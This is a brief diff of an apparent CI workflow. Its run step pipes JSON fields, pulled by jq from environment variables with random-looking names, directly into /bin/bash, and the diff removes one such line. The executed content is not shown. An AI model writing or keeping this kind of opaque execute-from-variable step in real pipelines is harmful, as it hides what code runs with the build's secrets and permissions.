@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$c43129" | jq -r .oh168 | /bin/bash
           echo $z1 | jq -r .fpdir5321 | /bin/bash
-          printf '%s' "$mqm2" | jq -r .qlrmj9961 | /bin/bash
           echo $gml0 | jq -r .gxiwj1813 | /bin/bash
 
       - name: Upload archive
